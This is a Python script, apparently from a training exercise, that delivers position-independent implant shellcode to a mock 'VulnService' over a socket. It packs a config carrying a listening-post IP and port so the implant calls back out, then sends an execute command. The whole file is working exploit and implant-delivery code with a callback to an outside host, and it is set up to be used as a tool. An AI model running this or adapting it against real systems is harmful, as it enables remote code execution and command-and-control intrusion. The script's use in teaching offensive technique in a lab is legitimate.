#--------------------------------------------------------------------------------------------------
# MockExploit.py
#
# Uploads shellcode to VulnService
#--------------------------------------------------------------------------------------------------
import argparse
import socket
import struct
from enum import IntEnum

#
# Port to connect to
#
TARGET_PORT = 12345

#
# Message types/commands
#
class MESSAGE_TYPE(IntEnum):
    OK = 0
    ERR = 1
    CONFIG = 2
    PAYLOAD = 3
    EXEC = 4
    QUIT = 5
    MAX = 6


def exploit(target, config, payload):
    s = socket.create_connection((target, TARGET_PORT))

    config_msg = struct.pack("<II", MESSAGE_TYPE.CONFIG, len(config)) + config
    s.send(config_msg)
    s.recv(8)

    payload_msg = struct.pack("<II", MESSAGE_TYPE.PAYLOAD, len(payload)) + payload
    s.send(payload_msg)
    s.recv(8)

    exec_msg = struct.pack("<II", MESSAGE_TYPE.EXEC, 0)
    s.send(exec_msg)
    s.recv(8)
    s.close()


def build_config(listener_ip, listener_port, payload):
    # IMPORTANT NOTE:
    # The length of this bytestring determines how much space the exploit allocates
    # for the implant's CONFIG structure. Make sure the length matches the definition
    # of 'struct CONFIG' in your implant.

    # --------- TODOs -----------
    # pack config structure to match new Config struct layout as seen in Config.h, pad with 0's until full size
    config_size = 56
    config = bytearray()
    config += struct.pack("<Q", 0)
    config += struct.pack("<I", len(payload))
    config += socket.inet_aton(listener_ip)
    config += struct.pack(">H", listener_port)
    config += b'\x00' * (config_size - len(config))
    return config


def getArgParser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs='?', default='127.0.0.1', help="Hostname or IP of target.")
    parser.add_argument("listener_ip", nargs='?', default='127.0.0.1', help="Hostname or IP of listening post.")                # TODO: default to any?
    parser.add_argument("listener_port", type=int, nargs='?', default=31337, help="Port number for listening post.")      # TODO: default port
    parser.add_argument("payload", nargs='?', default='ImplantPIC_shellcode.bin', help="File containing the executable payload. Must be position-independent.")
    return parser


if __name__ == "__main__":
    opts = getArgParser().parse_args()

    with open(opts.payload, 'rb') as f:
        payload = f.read()

    config = build_config(opts.listener_ip, opts.listener_port, payload)

    exploit(opts.target, config, payload)
